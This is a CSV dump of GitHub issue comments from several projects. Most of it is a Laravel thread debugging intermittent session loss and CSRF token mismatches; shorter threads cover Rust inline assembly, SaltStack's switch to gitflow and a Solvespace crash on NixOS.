rust/rust-lang/29722/447662565,29722,"@friend wrote I mean, not entirely out of luck. You just have to use Rust's . I have an edge case that none of your listed workarounds cover here. As you say, if you're familiar with the process from other compilers it's mostly fine. (I have another use case I would like to teach systems programming computer architecture and stuff using Rust instead of C someday. Not having inline assembly would make this much more awkward.) I wish we would make inline assembly a priority in Rust and stabilize it sooner rather than later. Maybe this should be a Rust 2019 goal. I am fine with any of the solutions you list in your nice comment earlier I could live with the problems of any of them. Being able to inline assembly code is for me a prerequisite to writing Rust instead of C everywhere I really need it to be stable. ",,False
rust/rust-lang/29722/447672333,29722,"Please write  a Rust 2019 blog post and express this concern. I think if enough of us do that, we can influence the roadmap. ",,False
rust/rust-lang/29722/448037987,29722,"To clarify my comment above - the problem is that the documentation does not explain just how ""deeply"" the contents of the  macro are parsed/interacted with. I'm familiar with x86 and MIPS/ARM assembly but presumed that llvm had its own assembly language format. I've used inline assembly for x86 before, but was not clear on to what extent the bastardization of asm to brige C and ASM went. My presumption (now invalidated) based off the wording in the rust inline assembly section was that LLVM had its own ASM format that was built to mimic x86 assembly in either at&amp;t or intel modes, and necessarily looked like the x86 examples shown. (What helped me was studying the expanded macro output, which cleared up what was going on) I think there needs to be less abstraction on that page. Make it clearer what gets parsed by LLVM and what gets interpreted as ASM directly. What parts are specific to rust, what parts are specific to the hardware you are running on, and what parts belong to the glue that holds them together. ",,False
rust/rust-lang/29722/448718803,29722,"Recent progress on cross-language LTO makes me wonder if some of the downsides of this avenue can be reduced, effectively inlining this ""external assembly blob"". ",,False
rust/rust-lang/29722/448732609,29722,"Even if this works, I don't want to write my inline assembly in C. I want to write it in Rust. -) ",,False
rust/rust-lang/29722/448734015,29722,"You can compile and link  and  files directly (see for example this crate), which in my book are far enough from C. ) ",,False
rust/rust-lang/29722/448738023,29722,I believe this is not currently feasible as cross-language LTO relies on having LLVM IR and assembly would not generate this. ,,False
rust/rust-lang/29722/448765777,29722,You can stuff assembly into module level assembly in LLVM IR modules. ,,False
rust/rust-lang/29722/479977512,29722,"Does anyone know what the most recent proposal/current status is? Since the theme of the year is ""maturity and finishing what we started"", it seems like a great opportunity to finally finish up . ",,False
rust/rust-lang/29722/479986590,29722,Vague plans for an new (to be stabilized) syntax were discussed last February  to those notes @friend and @friend signed up to write an RFC. ,,False
salt/saltstack/236/2241610,236,"Hi Thomas, I want to make progress... gitflow [0] is next thing to attack. Here's how to do it... it's trivial as you can see (of course, you don't clone but use the orig repo) sa@friend/tmp$ git clone  into salt... remote Counting objects 7943, done. remote Compressing objects 100% (2398/2398), done. remote Total 7943 (delta 5480), reused 7907 (delta 5450) Receiving objects 100% (7943/7943), 1.22 MiB | 756 KiB/s, done. Resolving deltas 100% (5480/5480), done. sa@friend/tmp$ cd salt/; git branch -a * master   remotes/origin/HEAD -&gt; origin/master   remotes/origin/highstate   remotes/origin/master (master u=) sa@friend/tmp/salt$ git flow init -d Using default branch names.  Which branch should be used for bringing forth production releases?    - master Branch name for production releases [master]  Branch name for ""next release"" development [develop]   How to name your supporting branch prefixes? Feature branches? [feature/]  Release branches? [release/]  Hotfix branches? [hotfix/]  Support branches? [support/]  Version tag prefix? []  (develop) sa@friend/tmp/salt$ git branch -a * develop   master   remotes/origin/HEAD -&gt; origin/master   remotes/origin/highstate   remotes/origin/master (develop) sa@friend/tmp/salt$ git push -u origin develop  Finally go to github's admin interface for salt and make develop the default branch. We're done... best of both worlds, stable master from now on, no more direct pushes to master plus we can keep the attitude of fast progress/experimenting because wild coding monkeys can start feature branches and fire away ) [0] on Debian  or from source ",,False
salt/saltstack/236/2768011,236,"markusgattol, I am all for this, and it is the next thing I will set up. Sorry I have been slow on the uptake, been a busy couple of days! ",,False
salt/saltstack/236/2824015,236,branch was created on the 17th and set as default in GitHub -- closing. ,,False
nixpkgs/NixOS/32393/279908954,32393,"Issue description Using any of the following file menu commands opening a file dialog window will crash Solvespace on KDE Plasma  Open... Save Save As... Export Image... Export 2d View... Export 2d Section... Export 3d Wireframe... Export Triangle Mesh... Export Surfaces... Import...  If Solvespace is started from a konsole, one gets the following error message after the program crash A similar, maybe the same, problem was already discussed in solvespace/solvespace#215, but could not be solved. In addition, other programs experience(d) similar problems in NixOS, e.g., #24943. Steps to reproduce  Install Solvespace by adding  to the list of  in  and running  Log in KDE Plasma Open a Konsole Run  Open a file dialog by, e.g., selecting File -&gt; Save...  Technical details  system  host os  multi-user?  sandbox  version  channels(root)  nixpkgs   ",,False
nixpkgs/NixOS/32393/349786602,32393,"You opened the issue originally in the right location. The author of solvespace should fix his program to report a specific error message and not crash inside one of its dependent libraries. This is not a NixOS problem. Solvespace is developed on a particular operating system and as a result it only is portable to that system. If you want to make the program work on NixOS, you need to fix the program. The observed behaviour does not warrant a change in NixOS. The solvespace people refer to ""Building on Linux"". This seems to suggest that they think it is portable across Linux systems, while it obviously is not. Portable code runs unmodified and without patches across a wide range of *nix based systems. I suggest you run it inside a Docker container or inside a Debian VM until they fix it. ",,False
nixpkgs/NixOS/32393/349827946,32393,"For what it is worth, williammpratt's attitude here is not representative of the NixOS community's attitude toward other software. The user has since been blocked from the NixOS organization. ",,False
nixpkgs/NixOS/32393/350485938,32393,Looks like  is missing in the derivation. ,,False
nixpkgs/NixOS/32393/350487178,32393,I added this hook here 9c89e52ff20fc0f569afe8126e7f442ca575a676 ,,False
nixpkgs/NixOS/32393/352302042,32393,This issue was rediscovered in #32651. Backported in 3bee0c2f618df4197bc146259109adbf70a999d2. ,,False
framework/laravel/8172/64530609,8172,"6777 and #5416 still seem to be an issue, even for drivers other than .  // cc @friend, @friend, @friend, @friend, @friend, @friend, ",,False
framework/laravel/8172/86525663,8172,"We are experiencing token regenerating issue on Redis, I don't think it would be lock issue because redis is single thread and atomic, I used the method suggested in #6777 to debug and here is the log you can see that the token is regenerated out of nowhere. one more thing, when I was testing the application (sending many concurrent requests) on another tab I was not able to login! ",,False
framework/laravel/8172/86527608,8172,maybe related to this said by @friend in #5416 ,,False
framework/laravel/8172/90619857,8172,I can confirm this is happening using the file driver as well as the memcached driver. ,,False
framework/laravel/8172/90630947,8172,"Ok I added some code to log when a session starts when it stops (saves) and when the cookie is sent and here is the result as you can see in the middle the session id is regenerated because I have tried logging in when sending concurrent requests, and as you can see while the session id is changed the other concurrent requests are using the prior id so on next response the cookie is rewrote and you're logged out. any idea what can make this happen? ",,False
framework/laravel/8172/90951875,8172,"After testing on multiple machines / configurations, I was able to notice that it happens only using homestead without nfs folder sync. ",,False
framework/laravel/8172/91192639,8172,@friend why is this closed? ,,False
framework/laravel/8172/91429821,8172,"I tested this on Homestead v2.5 on my Windows 7 64bit box using VMWare. I tried using session drivers ,  and . I could not replicate despite doing thousands of AJAX requests. I'll keep trying some other methods... ",,False
framework/laravel/8172/91510730,8172,"I Taylor and I can't replicate this either, but it seems there are a good number of people that seem to have having this issue. ",,False
framework/laravel/8172/91520053,8172,"Could it have something to do with a change or bug in the latest PHP version? I'm using PHP 5.6.7 for both local development and my servers, and I have this issue on both. The rest of the setup is totally different (Windows/Debian, PHP server/nginx). ",,False
framework/laravel/8172/91556277,8172,@friend - the issue has been known since at least Dec 2014. So it was earlier than PHP 5.6.4 But there must be some combination of PHP/Server/Laravel versions that is causing it. Or perhaps even the OS or Server. Perhaps if more people with the issue can post their system configs/versions - we might see a common setup between them that we can use to narrow down the issue? ,,False
framework/laravel/8172/91563382,8172,I've tried further on a new Forge DigitalOcean box (lowest box - 512mb ram) - running PHP 5.6.7. I also tried with browsers Chrome41 + IE11 Still cant replicate ( ,,False
framework/laravel/8172/91569267,8172,"Its happening for me under xampp 3.2.1, windows 7, php 5.6, mysql 5.5.34, apache 2.4.7 As well on windows 8.1, php 5.6, mysql 5.6.24, nginx 1.7.12 ",,False
framework/laravel/8172/91575496,8172,@friend @friend - what browsers are you testing with? (I know it shouldnt matter - but I'm trying to think of every possibility) ,,False
framework/laravel/8172/91580913,8172,Firefox and Chrome. ,,False
framework/laravel/8172/91588778,8172,@friend - which exact browser versions are you using? And what code are you running to cause this issue? If you run the code in  do you get the problem? ,,False
framework/laravel/8172/91597307,8172,Home Pc Firefox 37.0.1 Chrome 41.0.2272.118 m Work PC Firefox Developer 39.0a2 (2015-04-06) Chrome 41.0.2272.118 m I'll test the code when I get home. It happens very inconsistently with both the general Auth + Sentinel. ,,False
framework/laravel/8172/91666941,8172,"My PC is running Windows 8.1, PHP 5.6.7, the PHP web server and Chrome 41.0.2272.118 m (64-bit). My first server is running Debian Sid, PHP 5.6.7 and nginx 1.6.2. My second server is running Debian Jessie, PHP 5.6.7 and nginx 1.6.2 also. @friend I've tried the code of issue #6777. I've run ~2500 queries without any mismatch (I checked the logs). I've also created a new Laravel 5 project and copied the added code into it, but can't reproduce it there either. Using my own Naxiz/L5-CSRF-TestCase@friend seconds after it, I get an exception after just 2 clicks. ",,False
framework/laravel/8172/91795854,8172,The #6777 was created on my local OSX dev machine using homestead (don't remember the version though). We initially found the problem on our DigitalOcean servers created through Forge. ,,False
framework/laravel/8172/92048584,8172,"@friend @friend I can easily replicate this error on our server and on my local machine, they have different versions of php different os, etc., I use laravel 4.1, on login form I simply click or enter the submit button 20-30 times repeatedly fast. as you know even on login the csrf token does not change, but I get a token mismatch error on this situation. ",,False
framework/laravel/8172/92349761,8172,@friend @friend @friend - can you visit this server - and tell me if you can make it fail  is using the exact fork of  - on a DigitalOcean server using Forge. I still cant replicate - but I'm wondering if you can make it fail? ,,False
framework/laravel/8172/92470607,8172,"We've been battling with this puzzle for 2 months now. On our busy production system, we get 2-3  per 24-hr period upon a simple form submission. During this same period we have ~150 succeed without issue. We've implemented very detailed debug logging and one pattern has emerged, which is browser related. Over the last 2 months, with 2-3 issues per-day, only these browsers have triggered the issue (by quantity, predominantly IE 11 and Android 4.4.* Chrome 41) Related SO question  have a Forge managed Linode with LEMP (nginx 1.6.2, php 5.6.6-1+deb.sury.org~trustyplus one and Laravel 5 up-to-date). So far, we have been unable to replicate in our testing on the said browsers. Here's an example log run for IE 10 ",,False
framework/laravel/8172/95494281,8172,Ping @friend @friend @friend @friend. Can you please see if you have the problem on this server   cant replicate - but I'm wondering if you can? Might help pinpoint the issue. ,,False
framework/laravel/8172/95539359,8172,"As far as I can see on that server specifically the issue doesn't seem to occur. But another issue that could be related is the fact the laravel session cookie seems to expire randomly, when it does a new session gets created like when you logout so you would lose that token? ",,False
framework/laravel/8172/96552913,8172,"@friend @friend @friend @friend @friend @friend  After a lot of investigation on the issue in our company, I came to this result, I hope it helps, first of all here is our environment specifications PHP 5.3.3 LARAVEL 4.1 OS centos 6 on server and os x mavericks in development environment APACHE 2 MYSQL 5.6.19 REDIS 2.4.10 PREDIS  0.8.* First of all it seems that the TokenMistmatch exception occurs in a varied different conditions, I nearly investigated all of them and was able to solve some of them, some depends on the logic behind the session and some can be bugs. In the following i will explain each situation that I have faced. 1. Expired sessions Let's say you have configured your session for 3 hours a user opens up a form and for some reason he leaves the computer (getting a cup of coffee) so after 3 hours when the session is expired he tries to submit a form and gets a token exception. this is why everyone once in while gets a token errror regardless of how much stable the application is, I can imagine of 2 ways to prevent it and they're renewing the session cookie using ajax on a timely basis, or increasing the session expire time to a considerable amount of time. 2. Concurrent requests when session is expired Sometimes on the load of your first page concurrent requests happen, for example the user has two different tabs open on chrome and when he reopens chrome chrome sends the requests simultaneously or you may have multiple concurrent ajax request on the load of the first page of your application. so note that the session cookie is received after the first response is received but you may send the next request before this happens and therefore you will get a new session (new cookie) on each requests, this can lead to token exception if one of these requests populates a form. you can prevent this scenario based on it's source, for example if the ajax request are causing the problem and you do not use session in ajax responses, you can disable sending the session cookie if the request is ajax, in the second scenario (clicking the submit button multiple times) you can simple disable the button once it's submitted. 3. Concurrent requests on login When login is occurred, laravel for security reasons changes the session id, copy the session data and DESTROYS THE LAST SESSION so let say for some reason when logging in concurrent requests happen (clicking the login button multiple times) so the session id would be regenerated multiple times and DESTROYS the last generated sessions in the server side, as some of these requests still use the prior session id (which does not exist in the server side anymore) it leads to regenerating the CSRF token, please note that normally laravel does not regenerate the token on login if it can find the token in guest (not logged in) session, but in this case as the guest session is destroyed as a result it will regenerate the token and it can result to token exception in other requests that are using the original token. also note that not only this issue can result in token exception it can also result in the user being logged out after one request, because the concurrent requests can change the logged in session. I solved this issue by changing one line in the laravel code, in  passing true to the migrate method of the session store will result in destroying the session on the server after migration, so now the data will remain on the server and destroyed on their expire time rather than on this request and it will solve the issue. I don’t know if we can call this a bug in laravel, but I guess we can come up with a better solution for this. 4. Browsers After investigating the logs it turned out that some of these token exceptions were because of the user’s browser not accepting the session cookie,I saw it the most on iOS Safari, I believe this is something we can do nothing about it. 5. Redis bug Some of the token exceptions on our sever was because of redis, for some reason laravel could not read the session data from the redis server when opening the session so it would result to the regeneration of the CSRF token. it was happening randomly on our server, so I tried changing the session driver and this type of exceptions faded away. I tried database, apc and file drivers and none produced this issue. I have not yet found what is causing the bug but i think it can be a bug with redis or the predis library. (as you know laravel 4.1 is not using the latest version of predis because of compatibility issues). Okay these are my experiences of the last 2 month working on this issue. I hope it may change your point of view regarding solution to this issue, the most important thing is that the token exception does not happen because of one reason it’s can be a result of multiple issue. please share with me if you have had similar incident or you have something new. ",,False
framework/laravel/8172/96778124,8172,We're not interested in issues with 4.1. We're not interested with issues with PHP 5.3. ,,False
framework/laravel/8172/96778166,8172,We want replication on Laravel 5.x. ,,False
framework/laravel/8172/96778388,8172,This is because it doesn't pose a security issue so we have no intention to patch it on 4.1.x. ,,False
framework/laravel/8172/96779876,8172,"@friend I'm aware but I was trying to lighten things up, wondering if anyone can test the similar situations on 5, I'm also upgrading the laravel of my application so then I can try again with L5. ",,False
framework/laravel/8172/96802831,8172,@friend Thank you. ) ,,False
framework/laravel/8172/96989320,8172,"@friend I can't reproduce it on your server. I also set up a new server at DigitalOcean and can't reproduce it there either. I thought it may have something to do with the time zone, because it's Europe/Amsterdam on all machines I can reproduce the issue on, but not on DigitalOcean, but after changing it I still can't reproduce it. ",,False
framework/laravel/8172/97375124,8172,"I got the same issue, I get some data that appear and desappears randomly, I'm guessing that it's from  the ajax long polling in my app. ",,False
framework/laravel/8172/97388553,8172,"@friend Can you please provide your laravel version, php version, session driver and the driver version and the exact way you are able to replicate this issue (even with sample code). thanks. ",,False
framework/laravel/8172/97403170,8172,"Im not sure if this related to this issue, but my session variables are not saved in the file session. I tried to quickly reproduce it with the following code in the latest Laravel (5.1-dev) In the example i except to get a filled  with 2 messages, but unfortunately i do not. When i try this exact example within Laravel 5.0.22 its working properly. After some debugging and digging within the  it should save all attributes (with ). But somehow the function is not triggered, but the if-loop requirements are all valid. ",,False
framework/laravel/8172/97412142,8172,@friend Laravel Framework version 4.2.17 PHP Version 5.5.12 Session driver 'file' This is a sample code of my long polling method in a regular Controller ,,False
framework/laravel/8172/97428277,8172,Laravel 4.2 is not supported. ,,False
framework/laravel/8172/97430568,8172,Yes - but this bug first appeared in 4.2 (or at least it was first reported then) - and has carried on into 5.0 - so it is still relevant to know of issues in 4.2. This bug is so elusive - yet it is clearly out there (with some many different server configs etc etc) - that the more info we get the better. We need as many reports as we can get. And knowing the bug exists in 4.2 helps to drill down the issue. There is obviously something common between 4.2 and 5.0 causing the bug? ,,False
framework/laravel/8172/97447563,8172,"@friend as @friend said the problem is common with v5.0, and what about applications running under Laravel 4.2 like my application which is production. ",,False
framework/laravel/8172/97448210,8172,"We are not supporting 4.2. If we do finally fix this, we will only be merging the fix into 5.0 or 5.1, depending in which one is stable at the time. ",,False
framework/laravel/8172/97477112,8172,So I hope people can help to find the bug asap otherwise we all have to migrate to L6.0 or 7.0 because of this bug! ,,False
framework/laravel/8172/99112012,8172,"I was able to reproduce this bug. Laravel 5.0 PHP 5.6 (provisioned by Forge) Session drivers redis, file The race condition occurred due to images pointing to dynamic URL (image generation was handled by Laravel). Browser was processing the request, but also trying to load the images. The main request was updating the session, but on some cases the requests to images were resetting it. Consider this simple timeline R1 (SS)-------------(DP)-----------(SC) R2 --------------(SS)---------------------------(SC) Legend SS - session starts - data is read from the storage DP - data is put to the session SC - session is closed - data is written to the storage R1 - first request R2 - second request Since the second request has the old data it's writing them back to storage. I see two solutions for this  simple and naive - save session data only when they were changed session locking  In my case I've simply disabled session saving for image requests. What do you think about it? ",,False
framework/laravel/8172/99237513,8172,"That seems like a good optimisation to make anyway, though if people are storing large objects in the session, could be slow to check for changes. ",,False
framework/laravel/8172/99238658,8172,"@friend If we make that optimisation, it might be an idea to ditch the serialise/unserialise stuff and not support putting objects in the sessions. It seems like a silly idea to do that anyway? ",,False
framework/laravel/8172/99255755,8172,"To check for changes you could md5 the serialized array. On Tuesday, May 5, 2015, Graham Campbell notifications@friend.com wrote ",,False
framework/laravel/8172/99350880,8172,"I had another idea for this - make a flag (e.g  ) ), every call to ,  etc will mark it to . If so - session should be saved. Does this make sense? ",,False
framework/laravel/8172/99409729,8172,"Yeh, I guess. I was hoping for an optimisation where we could break out before we even serialised anything, since the serialisation process could actually take longer than storing the session in some cases. ",,False
framework/laravel/8172/99409995,8172,"That wouldn't work for objects. People can modify them by reference, so they never hit the put or push methods. ",,False
framework/laravel/8172/99411657,8172,Maybe relevant  references the WriteCheckSessionHandler and a note ,,False
framework/laravel/8172/99417724,8172,"Hmm, that's a very important point. ",,False
framework/laravel/8172/99928989,8172,"There is this report on SO  cacheclear Flushes User Sessions. Is this Intended?"" It affects Redis according to the post. Might be related? i.e. we've been searching for session issues - but might be a related cache issue as well? ",,False
framework/laravel/8172/99930383,8172,"Yes. If you're using the same store for sessions as for cache, expect clearing the cache to destroy ALL data in the store. ",,False
framework/laravel/8172/100332824,8172,@friend I'm the one who posted that (now deleted) question on SO. I was just looking for the confirmation Graham provided above. It wasn't related to the issue you guys are discussing here. ,,False
framework/laravel/8172/102999611,8172,"Yea happening to me as well. Same browser, two different environments one staging server, one my local. Everything works fine on local, however staging environment writes new session to file at every request. Both environments are Ubuntu 15, with latest servers and PHP-FPMs installed. From time to time my local messes up as well. But miraculously it fixes itself. None of the environments have more than 1 request per 10 secs ) So can't be a load/race-condition issue. ",,False
framework/laravel/8172/103005473,8172,"Okkk... Right now, I have this problem in both environments and I decided to dig in with XDebug. I will be posting my discoveries here. Note I am testing the case in both Chrome and Firefox (latest versions as of now). I have Firebug's latest beta version installed with Firefox to get latest features such as CSS-Maps etc. I also have my app under  and  domains set locally of course. I have set . I cleared all my cookies from both browsers before starting the tests and ran commands  +  + . Currently my observations are as following  Chrome console only shows  cookie only. No  cookies whatsoever. Firefox on other hand shows both  and  cookies. Both browsers renew these cookies and write new session file everytime I reload the page.     When debugged with XDebug, for line   actually detects no  cookies    as a value to  there. Same goes for Chrome as well  So I guess, none of the browsers actually detect  cookie. And if that cookie is not present, new session cookie will be written. Am I missing anything so far or doing something wrong, @friend  @friend ? ",,False
framework/laravel/8172/103008369,8172,"Additionally, I gathered cookies are not allowed to be set in top-level-domains (such as ) in Chrome - and from specs-viewpoint, that's the case. Firefox on the other hand, allows setting them for TLDs. Although my code is behind  domain, which isn't a TLD, I will setup some bogus real-looking domain and test it again. ",,False
framework/laravel/8172/103011549,8172,"@friend @friend  I just noticed - please check the screenshot from Firefox above and notice domains of  cookie. It is not the domain app works with, but rather . ",,False
framework/laravel/8172/103012908,8172,Is this only happening when you're using environments? Try hard coding all your config. ,,False
framework/laravel/8172/103013330,8172,"Question I am not Symfony guru, but as I am currently searching for the cause of  cookie being set from  domain in some cases no matter what you do, I stumbled upon  unit-test method in Symfony. Question is is there a chance Symfony resolves the name (our domains, in case of locals and staging areas, our rather FAKE domains which always resolve to 127.0.0.1) to IP address and when it finds out that IP address is rather local, sets  cookies under ? It's just a hunch, nothing substantial to back it up right now. @friend  Ok, I will hard-code configs. I was using  file. ",,False
framework/laravel/8172/103013520,8172,Meanwhile my  file  ,,False
framework/laravel/8172/103014137,8172,"We're already aware of concurrency issues with the environment system. I'm wondering if this session issue is actually just this same issue, applied. ",,False
framework/laravel/8172/103014373,8172,"@friend Just a word of warning might want to take down that screenshot of your .env file its got your Google and Twitter OAuth details in, might want to obfuscate them before uploading it again. ",,False
framework/laravel/8172/103014526,8172,@friend Bit late for that. They'll need invalidating. ,,False
framework/laravel/8172/103014653,8172,"No worries folks, they are for dev purposes, can be invalidated in a whim. ) ",,False
framework/laravel/8172/103015122,8172,"@friend , I changed to  in  config file. Results are the same. ",,False
framework/laravel/8172/103015944,8172,"I'm meaning, don't use the env system at all for any config and see what happens. ",,False
framework/laravel/8172/103019015,8172,"@friend fixed the problem. Value  inside  file must be set correctly. I set it the same value as my fake real-looking domain - in my case  - and session is working now. Setting that value as  and accessing the app from  domain does NOT work in Chrome (as per aforementioned reason cookies are not designed for TLDs and Chrome follows that rule), but works in Firefox. Setting it to  (fake domain I used for my project in general) works as well. To those who work with Socialite, be warned since Twitter doesn't accept  and G+ doesn't accept unreal domains like   in callback-URIs, you should be working with real-looking domains to avoid all these problems altogether. ",,False
framework/laravel/8172/103019758,8172,Or we could just set that line like  and move that setting to dotEnv? ,,False
framework/laravel/8172/103021053,8172,"@friend - setting the domain to solve your session problem doesnt sound like rest of the problem the rest of us are having. We have random session fails, sometimes under heavy load from AJAX. But our sessions work most of the time. Yours doesnt - so it would seem to be a different issue than discussed here unfortunately. ",,False
framework/laravel/8172/103021486,8172,"@friend Yea, I think it might be. That might be related to that ""race-condition"" topic mentioned before, I guess. Or something related to  not locking file before reading (which would clearly break concurrency in session handling). @friend , I believe my posts might have diverted this discussion away from original topic/problem at hand. If you guys believe this is the case, please feel free to delete my posts and put one tiny notification for those who would have the same problem I did today. No need to clutter this topic, if my posts are close to irrelevant. ",,False
framework/laravel/8172/103022293,8172,I suspect that's caused by the env system. Can anyone confirm this? ,,False
framework/laravel/8172/103023001,8172,@friend - if people run  - would they still be subjected to env system concurrency issue? I'm guessing not? ,,False
framework/laravel/8172/103024475,8172,True. Are people still experiencing this after caching the config? ,,False
framework/laravel/8172/103024743,8172,"That is, with drivers other than file. People were complaining of issues with redis too? ",,False
framework/laravel/8172/103025290,8172,Ping @friend @friend @friend @friend @friend Are you running Laravel 5? If yes - are you using ? If not - can you try and use that feature (which is helpful in production anyway) and see if the problem continues? ,,False
framework/laravel/8172/103159242,8172,"@friend that would make sense. If the putenv was being unset for that second request, the Encrypter wouldn't be using the correct app key to decrypt the cookie. Here are the relevant threads ",,False
framework/laravel/8172/103165389,8172,We aren't using configcache at all. Not any other caching in our development environments. Although since I switched to redis the issue has stopped happening. ,,False
framework/laravel/8172/103169230,8172,"I think this is pretty much sorted. To avoid this bug, use config caching and a driver that's not ""file"". ",,False
framework/laravel/8172/103169388,8172,"The ""file"" driver was never intended for large scale production use. ",,False
framework/laravel/8172/103201709,8172,"It does apparently fail with a few concurrent AJAX requests (on a single page), which has nothing to do with production... ",,False
framework/laravel/8172/103204215,8172,What does. Does redis fail after using configcache first? ,,False
framework/laravel/8172/103204976,8172,The file driver. ,,False
framework/laravel/8172/103207551,8172,"We already know that's broken, and it's not getting fixed. That wasn't the purpose of this issue. Look at the very top. ",,False
framework/laravel/8172/103207619,8172,,,False
framework/laravel/8172/103208185,8172,"I opened this to investigate drivers other than the file one because there's no way they should be failing, and that seems to be resolved. Taylor already rejected the overly strict file driver fixes. The recommended advice would be to not use the file driver. ",,False
framework/laravel/8172/103217068,8172,"I discovered the bug using the database driver, so it’s certainly not only the file driver. It seems it doesn’t matter whether is use the file or database driver. From Graham Campbell [mailtonotifications@friend.com]  Sent 18 May 2015 2254 To laravel/framework Cc Louis Matthijssen Subject Re [framework] [5.0] Session Persistance Issues (#8172) I opened this to investigate drivers other than the file one because there's no way they should be failing, and that seems to be resolved. Taylor already rejected the overly strict file driver fixes. The recommended advice would be to not use the file driver. — Reply to this email directly or view it on GitHub  .  ",,False
framework/laravel/8172/103219023,8172,@friend did you also try caching your config? ,,False
framework/laravel/8172/103220551,8172,"I did, and I got a TokenMismatchException after just a few submits using my own test case. These are not even AJAX or concurrent connections. Unfortunately I don’t have much time to look into this issue myself at the moment, I’ll report back if I find anything useful later. ",,False
framework/laravel/8172/103228409,8172,@friend so given that it seems to remain unclear whether this is related to dotenv. ,,False
framework/laravel/8172/103617367,8172,"@friend As I said, we're not interested in the file driver. We already know it's limited. ",,False
framework/laravel/8172/104642681,8172,"I'm using config caching, but still I have session persistence issues. Session in not being stored sometimes (randomly). Both on  and  drivers. ",,False
framework/laravel/8172/104643118,8172,"This is causing us quite a lot of headache, days of debugging and the problem turns out to be a session handing in laravel / ",,False
framework/laravel/8172/104757988,8172,What driver? ,,False
framework/laravel/8172/104758473,8172,We tried both  and ,,False
framework/laravel/8172/104758614,8172,plus config caching enabled ,,False
framework/laravel/8172/104758722,8172,"To add to the pain, issue is intermittent. So we get 3 invalids in 30 tries. ",,False
framework/laravel/8172/104758773,8172,3 invalid what? ,,False
framework/laravel/8172/104758795,8172,@friend how rapid are requests? Are you making them in quick succession or are they spaced out? ,,False
framework/laravel/8172/104760847,8172,"@friend knows better, I've been following development only from the managers perspective. @friend  no pattern there really. lets say 5 secs &lt;-&gt; 15 secs. I also noticed that on windows+chrome combination it was easier to reproduce problem than on mac+chrome, but this could have been pure coincidence. Also number of users/sessions seemed to have worsened the problem. @friend bad wording on my part, we store specific key in the user session. In rare occasions 3 out of 30 this wasn't set correctly. But as I said @friend knows better, so lets wait for his insight. ",,False
framework/laravel/8172/104761116,8172,"@friend I'm having this issue with the  driver, also with the config caching. Also, there is at least 5 seconds between the requests but it still happens. ",,False
framework/laravel/8172/104761748,8172,"The issue appears at nearly no concurrent requests. I mean just me testing on homestead. Session is not being saved sometimes. Simplified TL;DR I set session key  to a certain value ( of post) in  route. I have also  where I output the value of . Sometimes the value is old one, I mean session key isn't being saved. Issue remained when we switched to redis as a session driver and enabled config caching. The only solution I figured out, is that now I'm saving its' value in  field on user object and it works fine. ",,False
framework/laravel/8172/104762953,8172,@friend can you try to create just a simple GET route that you hit repeatedly with a page refresh until you get the problem? I'm trying to determine if the problem is related to multiple concurrent AJAX requests in certain environments. ,,False
framework/laravel/8172/104763381,8172,"I think we're particularly interested in a demo application that can recreate the problem in Homestead using the Redis or Memcached driver. On Fri, May 22, 2015 at 344 PM, Jan Hartigan notifications@friend.com wrote ",,False
framework/laravel/8172/104770185,8172,"@friend I reproduced it and as @friend said, it fails when I rapidly hit ""get"" route with browser refresh. Demo app I created a demo app at my local homestead   code Example  How to reproduce Open two tabs as shown on screenshot above. Hit  route once to set random number. Then refresh the same page and then rapidly hit  route (Click ⌘+R several times quickly). Value remains the same (old) in get route. I'll try to record a video now. ",,False
framework/laravel/8172/104770755,8172,@friend so just to clarify...you can't replicate the problem without rapid refreshes? ,,False
framework/laravel/8172/104771877,8172,@friend I'll tried now (~50 tries) and couldn't. I only replicated when I refreshed  quickly. It seems like the problem occurs when the following happens  started saving to session. ( route) read the value. ( route) finished saving to session. ( route)  ,,False
framework/laravel/8172/104772375,8172,"@friend looks suspiciously like the multi-thread problem, but I can't imagine how that would matter when config is being cached. ",,False
framework/laravel/8172/104778010,8172,@friend Here's a video I just recorded  Redis Config cached Environment Homestead 2.0.7 ,,False
framework/laravel/8172/104779651,8172,"Trying to figure out what you are showing in that video. Are you trying to demonstrate at the end how your value gets stuck on that single integer? On Fri, May 22, 2015 at 426 PM, Levan Velijanashvili  notifications@friend.com wrote ",,False
framework/laravel/8172/104782056,8172,"Exactly. Take a closer look at active windows (can be seen using window shadows) and refresh buttons.  I refresh  route. Prints generated random number and sets it to session. Then I gently refresh  route that outputs value from session (see code posted by me above) I repeat this action again and everything still seems to be fine. Then I refresh  route again, quickly switch to  and rapidly hit CMD+R several times. route outputs new random number it set to session. Then I gently refresh  route several times with normal intervals and the see the value is the same as it was in step 3.  ",,False
framework/laravel/8172/104783123,8172,"I can't recreate the issue @friend is talking about... I do the cmd + R thing as fast as I can and i see it refreshing, but then if I set a new number to the session, refreshing  again gets the new value correctly. ",,False
framework/laravel/8172/104783712,8172,@friend You should start rapidly hitting  before  finishes its work and outputs new value. I'm doing it at 008-018 in the video ,,False
framework/laravel/8172/104783820,8172,Did that too... I can't recreate it. ,,False
framework/laravel/8172/104783918,8172,"I thought this was solved by switching to redis, but today I was randomly getting this issue as well, not even spamming my system, just generally browsing though it and it came up with TokenMismatchException and the session was gone. ",,False
framework/laravel/8172/104784007,8172,1) I did open this page on first window  and this one on the other window  pressed cmd + r on the first window for more than 30 times 4) refreshed the second window and the numbers were different ,,False
framework/laravel/8172/104784495,8172,"@friend I think you're doing different thing. You should refresh  to set a new value to session and until it returns the result, you should refresh  several times quickly. During your refreshes the  will set a new value to session (but will fail silently). You continue refreshing  route and the value remains unchanged, i.e.  didn't really set the value to session. /cc @friend ",,False
framework/laravel/8172/104784719,8172,I think this thread is sort of becoming a dumping ground for anyone who has any random issue with the session. / ,,False
framework/laravel/8172/104785528,8172,@friend your right! did the same test this time and got different numbers ,,False
framework/laravel/8172/104863905,8172,"@friend this is not a random issue, the problem is real, and quite annoying, recreated by number of people here. We can go in two directions from here, pretend that there is no problem and continue with our lives, or actually acknowledge its existence and do something about it. ",,False
framework/laravel/8172/104870904,8172,Maybe it's a hardware/environment problém ? because I can't reproduce the issue ,,False
framework/laravel/8172/104871362,8172,"@friend I think it's from the service that you are using (localtunnel.me) I think it's caching or somthing like that, try at localhost ",,False
framework/laravel/8172/104871872,8172,@friend we can reproduce problem on homestead+mac. And ubuntu 12.04 LTS VPS. ,,False
framework/laravel/8172/104874009,8172,@friend I really tried many times without any problem  on Windows 8.1 WAMP server ,,False
